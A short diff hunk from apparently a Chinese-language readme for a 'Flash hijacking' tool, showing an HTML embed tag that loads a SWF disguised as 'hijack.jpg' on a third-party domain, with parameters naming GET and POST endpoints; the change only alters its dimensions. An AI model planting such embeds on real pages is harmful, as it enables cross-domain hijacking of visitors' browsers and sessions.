@@ -5,7 +5,7 @@ flash 劫持轮子
 HTML：
 
 &lt;div&gt; 
-&lt;embed src=&quot;http://www.baidu.com/hijack.jpg?jpg=http://127.0.0.1/1.png&get=http://127.0.0.1/l.php&post=http://127.0.0.1/2.php&quot; width=&quot;970&quot; height=&quot;107&quot; quality=&quot;high&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; type=&quot;application/x-shockwave-flash&quot; wmode=&quot;transparent&quot;&gt;&lt;/embed&gt; 
+&lt;embed src=&quot;http://www.baidu.com/hijack.jpg?jpg=http://127.0.0.1/1.png&get=http://127.0.0.1/l.php&post=http://127.0.0.1/2.php&quot; width=&quot;500&quot; height=&quot;500&quot; quality=&quot;high&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; type=&quot;application/x-shockwave-flash&quot; wmode=&quot;transparent&quot;&gt;&lt;/embed&gt; 
 &lt;/object&gt; 
 &lt;/div&gt;
 
